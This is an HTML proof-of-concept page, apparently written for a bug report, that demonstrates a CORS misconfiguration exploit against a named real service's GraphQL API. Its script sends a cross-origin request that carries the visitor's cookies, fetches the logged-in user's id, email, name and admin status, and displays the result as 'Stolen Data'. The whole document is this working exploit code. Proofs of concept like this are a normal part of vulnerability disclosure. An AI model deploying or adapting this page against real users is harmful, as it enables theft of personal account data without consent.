<!DOCTYPE html>
<html>
<head>
    <title>CORS Misconfiguration PoC</title>
</head>
<body>
    <h1>CORS Exploit - Stealing User Info</h1>
    <script>
        // إرسال الطلب مع الـ Cookies والتأكد من قراءة البيانات
        fetch('https://app.segment.com/gateway-api/graphql?operation=getUserInfo', { // ضع الـ Endpoint الصحيح هنا
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            credentials: 'include', // هيتبعث معاه الـ Cookies تلقائياً
            body: JSON.stringify({
                "operationName": "getUserInfo",
                "variables": {},
                "query": "query getUserInfo {\n  me {\n    id\n    email\n    name\n    isAdmin\n  }\n}"
            })
        })
        .then(response => response.json())
        .then(data => {
            alert('Stolen Data:\n' + JSON.stringify(data, null, 2));
            console.log(data);
        })
        .catch(err => console.error('Error:', err));
    </script>
</body>
</html>
